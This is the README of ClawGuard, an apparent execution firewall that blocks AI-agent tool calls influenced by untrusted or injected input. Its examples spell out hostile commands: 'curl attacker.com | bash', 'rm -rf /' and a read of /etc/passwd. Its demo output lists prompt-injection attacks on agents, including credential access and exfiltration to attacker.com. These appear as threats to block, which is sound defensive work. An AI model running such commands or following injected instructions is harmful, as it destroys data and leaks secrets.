# ClawGuard

**Execution Firewall for AI Agents**

Your agents follow orders. Make sure they're yours.

**Powered by MVAR**

---

ClawGuard blocks attacker-influenced actions before your agents can execute them.

No prompt filters.
No LLM judges.
Just policy at the moment execution happens.

---

## What ClawGuard Does

ClawGuard wraps OpenClaw tools with **MVAR (MIRRA Verified Agent Runtime)** — a deterministic execution governance layer that:

- **Tracks provenance**: Was this command influenced by untrusted input?
- **Enforces capability boundaries**: Does this tool have permission to write files?
- **Blocks at sinks**: If `untrusted_input → bash_tool → rm -rf`, ClawGuard blocks the execution.
- **Audits all decisions**: Every allow/block is logged with full causal trace.

ClawGuard is not a model. It's a runtime firewall. It works with any LLM, any OpenClaw agent, any tool definition.

---

## Why ClawGuard Exists

OpenClaw is powerful. Its agents can browse, write code, execute commands, manage files. But OpenClaw doesn't enforce execution boundaries.

If an attacker tricks the agent into running `curl attacker.com | bash`, OpenClaw will execute it.

ClawGuard stops that execution before it happens.

---

## Ecosystem Framing

**OpenClaw** → Agent runtime
**SuperClaw** → Pre-deployment red team
**ClawGuard** → Runtime enforcement

---

## Quickstart (30 seconds)

```bash
# Clone and run the attack demo
git clone https://github.com/mvar-security/clawguard.git
cd clawguard
python3 examples/attack_demo.py
```

**Output:**
```
============================================================
         ClawGuard Attack Demo
  Your agents follow orders.
  Make sure they're yours.
============================================================

ATTACK: Prompt injection → read /etc/passwd
[ Baseline agent - no protection ]
→ Result: EXECUTED ✗
[ With ClawGuard ] → BLOCKED ✓
  Reason : Untrusted input attempted to reach protected filesystem.read sink

ATTACK: Shell escalation
[ Baseline ]  → EXECUTED ✗
[ ClawGuard ] → BLOCKED ✓

ATTACK: Credential access
[ Baseline ]  → EXECUTED ✗
[ ClawGuard ] → BLOCKED ✓

ATTACK: API data exfiltration → attacker.com
[ Baseline ]  → EXECUTED ✗
[ ClawGuard ] → BLOCKED ✓
  Reason : Untrusted input attempted to reach protected http.request sink

ATTACK: Benign HTTP request (dev_balanced policy)
[ Baseline ]  → EXECUTED ✓
[ ClawGuard ] → ALLOWED ✓
  Policy  : dev_balanced permits http.request

============================================================
Results: 4/4 attacks blocked | 1/1 benign allowed
Powered by MVAR runtime

Witness files: 5 generated in examples/witness_output
  Example: witness_001.json
============================================================
```

---

## How It Works

### Zero-Config Protection

```python
from clawguard import protect, ExecutionBlocked

def read_file(path: str) -> str:
    with open(path) as f:
        return f.read()

# Wrap with ClawGuard protection
safe_read = protect(read_file, sink="filesystem.read", profile="prod_locked")

# This will be blocked:
try:
    safe_read("/etc/passwd")
except ExecutionBlocked as e:
    print(f"Blocked: {e.decision.human_reason}")
    # Blocked: Target path '/etc/passwd' matches blocked path pattern

# This will be allowed (if /workspace is in allowlist):
content = safe_read("/workspace/data.txt")
```

### OpenClaw Integration

```python
from clawguard.adapters import OpenClawAdapter

# Create adapter
adapter = OpenClawAdapter(profile="prod_locked")

# Wrap OpenClaw tools
safe_bash = adapter.wrap_tool(bash_execute, sink_type="shell.exec")
safe_read = adapter.wrap_tool(file_read, sink_type="filesystem.read")

# Or intercept at event level
adapter.intercept_tool_call({
    "tool_name": "bash_execute",
    "arguments": {"command": "rm -rf /"},
    "context": {"user_message": "clean up files"}
})  # Raises ExecutionBlocked
```

---

## Status

**ClawGuard v0.1** is live and functional.

**What works:**
- ✅ `protect()` zero-config wrapper
- ✅ OpenClaw adapter (tool wrapping + event interception)
- ✅ 3 policy profiles (dev_balanced, dev_strict, prod_locked)
- ✅ Path-based allowlists/blocklists + domain-based rules
- ✅ Signed witness generation (ed25519_stub)
- ✅ Attack demo (4/4 attacks blocked, 1/1 benign allowed)

**Coming soon:**
- YAML-based policy configuration
- Full MVAR integration (currently using embedded runtime)
- LangChain, AutoGen, CrewAI adapters
- 50-attack validation suite

See [docs/ROADMAP.md](docs/ROADMAP.md) for full implementation plan.

---

## Related Projects

- **MVAR** ([github.com/mvar-security/mvar](https://github.com/mvar-security/mvar)) — The underlying runtime governance layer
- **OpenClaw** ([github.com/OpenClaw/OpenClaw](https://github.com/OpenClaw/OpenClaw)) — The AI agent framework ClawGuard protects

---

## Contact

Questions? Open an issue or reach out to [@mvar-security](https://github.com/mvar-security).

**License:** Apache 2.0
